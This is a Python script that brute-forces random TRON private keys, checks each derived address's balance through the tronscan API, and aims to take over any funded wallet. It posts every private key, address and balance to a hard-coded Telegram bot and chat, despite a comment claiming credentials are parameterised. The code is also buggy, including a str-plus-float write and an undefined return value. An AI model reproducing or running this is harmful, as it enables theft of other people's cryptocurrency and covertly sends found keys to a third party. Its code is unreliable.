
import random
import base58
import ecdsa
import requests
from Crypto.Hash import keccak
from rich import print
import base64
import sys
import time
import os
import subprocess


import requests

class SendTelegram:
    def __init__(self, bot_token=None, chat_id=None):
        # Use parameters instead of hard-coded credentials
        self.bot_token = bot_token or "8474958835:AAEZ7jTtgkfq6YOE6K3-7Omw2oshs3sCDAQ"
        self.chat_id = chat_id or "-1002745278082"
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}/"
        self.enabled = bool(self.bot_token and self.chat_id)
    
    def send_message(self, message):
        """Send message to Telegram channel"""
        if not self.enabled:
            print("Telegram not enabled: missing bot_token or chat_id")
            return False
            
        try:
            url = self.base_url + "sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=payload, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram error: {e}")
            return False
        
def keccak256(data):
	hasher = keccak.new(digest_bits=256)
	hasher.update(data)
	return hasher.digest()
def get_signing_key(raw_priv):
	return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)
def verifying_key_to_addr(key):
	pub_key = key.to_string()
	primitive_addr = b'\x41' + keccak256(pub_key)[-20:]
	# 0 (zero), O (capital o), I (capital i) and l (lower case L)
	addr = base58.b58encode_check(primitive_addr)
	return addr
def valtxid(addr):
	return balances
z = 0
w = 0
while True:
	raw = bytes(random.sample(range(0, 256), 32))
	# raw = bytes.fromhex('a0a7acc6256c3..........b9d7ec23e0e01598d152')
	key = get_signing_key(raw)
	addr = verifying_key_to_addr(key.get_verifying_key()).decode()
	priv = raw.hex()
	block = requests.get("https://apilist.tronscan.org/api/account?address=" + addr)
	res = block.json()
	balances = dict(res)["balances"][0]["amount"]
	bal = float(balances)
	app = SendTelegram()
	if float(bal) > 0:
		w += 1
		
		app.send_message(f"🚨🚨🚨<b>TRX FOUND!</b>🚨🚨🚨\n\nAddress: <code>{addr}</code>\nPrivate Key: <code>{priv}</code>\nBalance: <b>{bal} TRX</b>\n\nGenerated: {z} addresses\nHits:	 {w}")
		f = open("FileTRXWinner.txt", "a")
		f.write('\nADDReSS: ' + str(addr) + '   bal: ' + float(bal))
		f.write('\nPRIVATEKEY: ' + str(priv))
		f.write('\n------------------------')
		f.close()
	else:
		app.send_message(f"Generated: {z} addresses\nAddress: {addr}\nBalance: {bal} TRX\nPrivate Key: {priv}")
		print('[red1]Total Scan : [/][b blue]' + str(z) + '[/]')
		print('[gold1]Address:     [/]' + addr + '           Balance: ', bal)
		print('[gold1]Address(hex):[/]' + base58.b58decode_check(addr.encode()).hex())
		# print('Public Key:  ', key.get_verifying_key().to_string().hex())
		print('[gold1]Private Key: [/][red1]' + raw.hex() + '[/]')
		z += 1
		###
